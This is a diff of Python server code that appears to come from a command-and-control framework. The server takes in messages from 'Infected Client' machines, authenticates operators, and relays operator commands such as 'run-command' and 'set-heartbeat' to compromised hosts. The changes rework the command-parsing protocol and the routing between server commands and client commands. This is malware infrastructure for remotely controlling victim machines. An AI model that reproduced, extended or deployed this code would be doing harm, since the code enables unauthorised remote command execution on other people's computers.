@@ -184,19 +184,6 @@ class ServerSockHandler:
                     self.conn.send(str_encode("1"))
                     logging.critical(f"Failed logon  from {username}, {self.client_remote_ip_port}")
 
-                '''
-                ## NOT NEEDED (for now)as the thread created after login handles all incoming
-                commands - I forgot it did that lol
-            elif self.client_type == "!_clientcommand_!":
-                print("Client Command")
-                #pass
-                ##check if user is actually authenticated, if not, quit
-
-                ##then
-
-                ##friendlyclientinstance interact
-                self.friendly_clients[friendly_client_name].friendly_client_communication(self.id, self.message)'''
-                
 ##====================================== Construction ===========
             elif self.client_type == "!_client_!":
                 logging.debug(f"Message from Infected Client {self.id} recieved")
@@ -274,11 +261,22 @@ class ServerFriendlyClientHandler:
         while message:
             raw_user_input = bytes_decode(self.conn.recv(1024))
             user_input = self.parse_msg_for_server(raw_user_input)         
-
+            print(f"HERE {raw_user_input}")
             try:
-                user_username = user_input[0]
-                user_command= user_input[1]
-                self.server_decision_tree(user_command)
+                user_header = user_input[0]
+                user_username = user_input[1]
+                user_command= user_input[2]
+
+                if user_header == "!_servercommand_!":
+                    self.server_decision_tree(user_command)
+                
+                ## has to be done/sent on fclient end
+                ## format that fclient needs to send(see client_decision_tree)
+                ## !_servercommand_!\|/ryan\|/action value CLIENTNAME
+                ##client name is always last for future compatability
+                elif user_header == "!_clientcommand_!":
+                    self.client_decision_tree(user_command)
+                
 
             except Exception as e:
                 logging.debug(f"Error with username or command, input={raw_user_input}: {e}")
@@ -298,19 +296,21 @@ class ServerFriendlyClientHandler:
             else:
                 self.send_msg("No Current Clients")
 
+        ## for all clients, 
+        ## a  for loop might work well here
         elif message == "stats":
             pass
+            """
+            for i in current_client_list
+                client = globals()[i]
+                return_stats_list.append(client.data_list)
+            """
+            #data_list
             ## Need: client instance name
             ## then call: client_instance.stats
         else:
             self.client_decision_tree(message)
 
-    def client_decision_tree(self, raw_message):
-        """
-        Handles commands  meant for the clients,  passed through the server
-        """
-        pass
-    
     def current_client_refresh(self) -> None:
         """
         Checks & adds any new clients to the self.current_client_list list
@@ -331,8 +331,8 @@ class ServerFriendlyClientHandler:
 
     ## TLDR: This sets jobs or gets current data from the current selected client
 
-    #                           Action      Value    Target Client 
-    #requests look like this: set-heartbeat 15 client_127_0_0_1_FCECW
+    #                                       Action       Value  Target Client 
+    #requests/raw messages look like this: set-heartbeat 15 client_127_0_0_1_FCECW
 
     """
     def client_decision_tree(self, raw_message):
@@ -345,7 +345,6 @@ class ServerFriendlyClientHandler:
         client_command_value = message[1]
         ##== Client name is always last
         client_name = message[-1]
-
 
         self.client = globals()[client_name]
         if client_name in self.current_client_list:
@@ -377,6 +376,10 @@ class ServerFriendlyClientHandler:
         elif client_command == "run-command":
             ## Sending back results of command run
             self.send_msg(self.client.interact("run-command", client_command_value))
+        
+        ## stats on a per client basis
+        elif client_command == "stats":
+            pass
 
     def send_msg(self, message:str):
         try:
@@ -400,9 +403,9 @@ class ServerFriendlyClientHandler:
         
         ## strip uneeded code here, replace THEN strip (goes from str -> list, the split returns a list)
         try:
-            parsed_results_list = raw_message.replace("!_usercommand_!\\|/","").split("//|\\\\")
+            parsed_results_list = raw_message.split("\\|/")
         except:
-            parsed_results_list = ["EMPTY","EMPTY"]
+            parsed_results_list = ["EMPTY","EMPTY","EMPTY"]
 
         return parsed_results_list
     
